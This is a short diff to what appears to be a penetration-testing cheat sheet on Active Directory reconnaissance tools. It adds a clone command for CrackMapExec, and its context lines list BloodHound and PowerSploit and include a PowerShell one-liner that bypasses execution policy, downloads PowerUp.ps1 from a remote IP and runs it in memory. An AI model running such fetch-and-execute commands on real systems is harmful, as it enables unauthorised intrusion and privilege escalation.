@@ -29,6 +29,9 @@
 * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+```bash
+git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
+```
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 ```powershell
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
